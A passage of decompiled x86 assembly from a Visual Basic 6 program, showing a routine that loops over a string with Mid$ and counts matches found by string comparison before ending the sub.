00813DEB: call 00410BF8h ; IIf
00813DF0: lea eax, var_68
00813DF3: push eax
00813DF4: call 00410C22h ; msvbvm60.dll.__vbaUI1Var
00813DF9: mov var_24, al
00813DFC: lea eax, var_68
00813DFF: push eax
00813E00: lea eax, var_58
00813E03: push eax
00813E04: lea eax, var_48
00813E07: push eax
00813E08: push 00000003h
00813E0A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00813E0F: add esp, 00000010h
00813E12: mov eax, var_18
00813E15: mov var_000000A0, eax
00813E1B: mov var_0000009C, 00000001h
00813E25: mov var_28, 00000001h
00813E2C: jmp 813E40h
00813E2E: mov eax, var_28
00813E31: add eax, var_0000009C
00813E37: jo 00813F1Fh
00813E3D: mov var_28, eax
00813E40: mov eax, var_28
00813E43: cmp eax, var_000000A0
00813E49: jnle 813EC3h
00813E4B: lea eax, var_1C
00813E4E: mov var_80, eax
00813E51: mov var_00000088, 00004003h
00813E5B: lea eax, var_38
00813E5E: mov var_70, eax
00813E61: mov var_78, 00004008h
00813E68: lea eax, var_00000088
00813E6E: push eax
00813E6F: push var_28
00813E72: lea eax, var_78
00813E75: push eax
00813E76: lea eax, var_48
00813E79: push eax
00813E7A: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
00813E7F: lea eax, var_48
00813E82: push eax
00813E83: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00813E88: mov edx, eax
00813E8A: lea ecx, var_34
00813E8D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00813E92: lea ecx, var_48
00813E95: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00813E9A: push var_34
00813E9D: mov eax, [ebp+10h]
00813EA0: push [eax]
00813EA2: movzx eax, byte ptr var_24
00813EA6: push eax
00813EA7: call 00410C1Ch ; msvbvm60.dll.__vbaStrComp
00813EAC: movsx eax, ax
00813EAF: test eax, eax
00813EB1: jnz 813EBEh
00813EB3: mov eax, var_2C
00813EB6: add eax, 00000001h
00813EB9: jo 813F1Fh
00813EBB: mov var_2C, eax
00813EBE: jmp 00813E2Eh
00813EC3: mov eax, var_2C
00813EC6: mov var_20, eax
00813EC9: push 00813EF8h
00813ECE: jmp 813EE7h
00813ED0: lea eax, var_68
00813ED3: push eax
00813ED4: lea eax, var_58
00813ED7: push eax
00813ED8: lea eax, var_48
00813EDB: push eax
00813EDC: push 00000003h
00813EDE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00813EE3: add esp, 00000010h
00813EE6: ret 
End Sub

